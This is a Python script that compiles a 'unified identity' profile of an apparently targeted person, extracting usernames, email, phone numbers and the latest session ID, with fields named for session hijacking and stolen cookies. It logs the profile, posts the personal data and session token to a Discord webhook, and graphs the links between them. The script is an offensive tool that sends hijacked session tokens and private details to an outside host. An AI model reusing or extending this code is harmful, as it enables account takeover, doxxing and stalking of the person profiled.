from requests import post
import dotenv
import json
from datetime import datetime
import os
import networkx as nx
import matplotlib.pyplot as plt

# Load unified identity
with open('data/unified_identity_alx_whatilove.json', 'r') as f:
    identity = json.load(f)

# 1. Extract key fields


def extract_identity(identity):
    usernames = identity.get('usernames', [])
    email = identity.get('email', None)
    phones = identity.get('phones', [])
    sessionids = identity.get('sessionids', [])
    sessions = identity.get('sessions', [])
    # Find latest valid sessionid by timestamp
    latest_session = None
    latest_time = None
    for s in sessions:
        ts = s.get('created') or s.get('hijack_timestamp')
        if ts:
            t = datetime.fromisoformat(ts.replace('Z', ''))
            if not latest_time or t > latest_time:
                latest_time = t
                latest_session = s
    latest_sessionid = None
    if latest_session:
        if 'sessionid' in latest_session:
            latest_sessionid = latest_session['sessionid']
        elif 'cookies' in latest_session and 'sessionid' in latest_session['cookies']:
            latest_sessionid = latest_session['cookies']['sessionid']
    # Behavioral patterns (simple example)
    shared_traits = {
        'location': identity.get('location'),
        'business': identity.get('business'),
        'aliases': identity.get('aliases'),
        'social_media': identity.get('social_media'),
        'status': identity.get('status'),
    }
    return {
        'usernames': usernames,
        'email': email,
        'phones': phones,
        'latest_sessionid': latest_sessionid,
        'latest_session_timestamp': latest_time.isoformat() if latest_time else None,
        'shared_traits': shared_traits
    }


unified_identity = extract_identity(identity)

# 2. Log to file
os.makedirs('logs', exist_ok=True)
with open('logs/unified_identity_summary.log', 'w') as logf:
    logf.write(json.dumps(unified_identity, indent=2, ensure_ascii=False))

# 3. Send to Discord if webhook is set

dotenv.load_dotenv('config/.env')
webhook = os.getenv('DISCORD_WEBHOOK_URL')
if webhook and webhook.startswith('http'):
    summary = f"Unified Identity: {unified_identity['usernames']}\nEmail: {unified_identity['email']}\nPhones: {', '.join(unified_identity['phones'])}\nSessionID: {unified_identity['latest_sessionid']}\nTimestamp: {unified_identity['latest_session_timestamp']}"
    post(webhook, json={"content": summary})

# 4. Pre-load into modules (stub: write to importable file)
with open('data/unified_identity_preload.json', 'w') as f:
    json.dump(unified_identity, f, indent=2, ensure_ascii=False)

# 5. Graph visualization
G = nx.Graph()
# Nodes
for u in unified_identity['usernames']:
    G.add_node(u, type='identity')
if unified_identity['email']:
    G.add_node(unified_identity['email'], type='email')
for p in unified_identity['phones']:
    G.add_node(p, type='phone')
if unified_identity['latest_sessionid']:
    G.add_node(unified_identity['latest_sessionid'], type='sessionid')
# Edges
for u in unified_identity['usernames']:
    if unified_identity['email']:
        G.add_edge(u, unified_identity['email'], label='shared usage')
    for p in unified_identity['phones']:
        G.add_edge(u, p, label='shared usage')
    if unified_identity['latest_sessionid']:
        G.add_edge(u, unified_identity['latest_sessionid'], label='session')
# Draw
plt.figure(figsize=(10, 7))
pos = nx.spring_layout(G)
nx.draw(G, pos, with_labels=True, node_color='skyblue',
        node_size=2000, font_size=10)
labels = nx.get_edge_attributes(G, 'label')
nx.draw_networkx_edge_labels(G, pos, edge_labels=labels)
plt.title('Unified Identity Graph')
plt.tight_layout()
plt.savefig('identity_graph.pdf')
try:
    import pyvis.network as net
    net_graph = net.Network(notebook=False)
    for n in G.nodes:
        net_graph.add_node(n, label=n)
    for e in G.edges:
        net_graph.add_edge(e[0], e[1])
    net_graph.show('identity_graph.html')
except ImportError:
    pass
print('Unified identity processing complete.')
